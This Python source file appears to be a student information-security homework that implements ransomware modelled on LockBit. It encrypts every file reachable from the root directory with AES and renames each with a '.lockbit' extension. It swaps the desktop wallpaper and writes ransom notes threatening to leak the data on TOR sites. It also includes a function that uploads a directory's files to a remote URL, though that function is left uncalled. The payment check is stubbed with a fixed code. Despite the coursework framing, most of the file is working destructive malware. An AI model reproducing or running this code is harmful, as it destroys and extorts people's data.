from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes
import os
import uuid
import subprocess
import requests

original_wallpaper = None
directory = '/'

from Crypto.Cipher import AES

def encrypt_file(file_name, key):
    try:
        data = ''
        with open(file_name, 'rb') as file:
            data = file.read()
        cipher_aes = AES.new(key, AES.MODE_EAX)
        ciphertext, tag = cipher_aes.encrypt_and_digest(data)
        with open(file_name, 'wb') as file_out:
            [ file_out.write(x) for x in (cipher_aes.nonce, tag, ciphertext) ]
    except Exception as e:
        pass

def decrypt_file(file_name, key):
    try:
        file_in = open(file_name, 'rb')
        nonce, tag, ciphertext = [ file_in.read(x) for x in (16, 16, -1) ]
        cipher_aes = AES.new(key, AES.MODE_EAX, nonce=nonce)
        data = cipher_aes.decrypt_and_verify(ciphertext, tag)
        with open(file_name, 'wb') as file_out:
            file_out.write(data)
    except Exception as e:
        pass


def change_wallpaper(file_path=None, restore=False):
    global original_wallpaper

    # If the restore parameter is True, restore the original background
    if restore:
        if original_wallpaper is not None:
            file_path = original_wallpaper
        else:
            print("No original wallpaper path saved.")
            return

    # If the original background image path has not been saved, save it
    if original_wallpaper is None:
        original_wallpaper = subprocess.check_output(["gsettings", "get", "org.gnome.desktop.background", "picture-uri"]).strip()

    # Change the desktop background
    command = "gsettings set org.gnome.desktop.background picture-uri file://{}".format(file_path)
    os.system(command)

def send_string_to_api(s):
    response = requests.post('http://localhost:5000/api', json={'id': s})
    if response.status_code == 200:
        return response.json()['value']
    else:
        return 0

def upload_files(directory, url):
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)
        with open(file_path, 'rb') as f:
            requests.post(url, files={'file': f})

if __name__ == '__main__':
    '''
    Before encrypt all the files , acturally should invoke function as
    `upload_files(directory, url)`
    However , Since we are not deploying the back-end code and database, we will simply use another conditional judgment instead
    '''
    # Generate a random AES key
    key = get_random_bytes(16)

    # Generate a RSA key pair
    private_key = RSA.generate(2048)
    public_key = private_key.publickey()

    # Encrypt the AES key using RSA
    cipher_rsa = PKCS1_OAEP.new(public_key)
    enc_key = cipher_rsa.encrypt(key)

    # Write the encrypted AES key to a file
    with open('encrypted_key.bin', 'wb') as file_out:
        file_out.write(enc_key)

    # Encrypt all files in the specified directory and its subdirectories
    original_names = {}
    for root, dirs, files in os.walk(directory):
        if root == 'special_path' or root == os.path.dirname(os.path.realpath(__file__)):
            continue
        for file in files:
            original_path = os.path.join(root, file)
            encrypt_file(original_path, key)
            random_string = str(uuid.uuid4())
            new_name = os.path.join(root, f"信息安全导论{random_string}.lockbit")
            os.rename(original_path, new_name)
            original_names[new_name] = original_path

    change_wallpaper('./DeskTop01.png')

    # Specify the path to the desktop
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    full_path = os.path.join(desktop_path, 'README.txt')
    with open(full_path,'w') as f:
        f.write('~~~Here are Information Security Introduction group homework.~~~\n')
        f.write('>>>>> Your data is stolen and encrypted.If you don\'t pay the ransom, the data will be published on our TOR darknet sites. Keep in mindthat once your data appears on our leak site, it could be bought by your competitors at anysecond, so don\'t hesitate for a long time. The sooner you pay the ransom, the sooner yourcompany will be safe.\n')
        f.write('You should transfer 100 RMB to account link and input you id to the programm')
    
    os.system(f'xdg-open {full_path}')
    
    for i in range(3):
        # Wait for user input
        input_data = input(f"Enter the billing id number for the transfer to decrypt files（{3-i} Times Only）: ")
        '''
        The next conditional judgment should be :
        `if send_string_to_api(input_data) == '1':`
        However , Since we are not deploying the back-end code and database, we will simply use another conditional judgment instead
        '''
        if input_data == '123456':
            # Decrypt the AES key using RSA
            cipher_rsa = PKCS1_OAEP.new(private_key)
            dec_key = cipher_rsa.decrypt(enc_key)

            # Decrypt all files in the specified directory and its subdirectories
            for new_name, original_path in original_names.items():
                if os.path.exists(new_name):
                    decrypt_file(new_name, dec_key)
                    os.rename(new_name, original_path)
            break
        else:
            continue

    change_wallpaper('./DeskTop02.png')

    full_path = os.path.join(desktop_path, 'READMEAgain.txt')
    with open(full_path,'w') as f:
        f.write('~~~Here are Information Security Introduction group homework.~~~\n')
        f.write('>>>>> Your data is stolen and encrypted.If you don\'t pay the ransom, the data will be published on our TOR darknet sites. Keep in mindthat once your data appears on our leak site, it could be bought by your competitors at anysecond, so don\'t hesitate for a long time. The sooner you pay the ransom, the sooner yourcompany will be safe.\n')
        f.write('You should transfer 100 RMB again to account link and input you id to the programm , all we will sale your files in your computer')
    
    os.system(f'xdg-open {full_path}')
    
    for i in range(3):
        # Wait for user input
        input_data = input(f"Enter the billing id number for the transfer to avoid saling your files publicaly（{3-i} Times Only）: ")
        '''
        The next conditional judgment should be :
        `if send_string_to_api(input_data) == '1':`
        However , Since we are not deploying the back-end code and database, we will simply use another conditional judgment instead
        '''
        if input_data == '123456':
            break
        else:
            continue
    change_wallpaper(restore=True)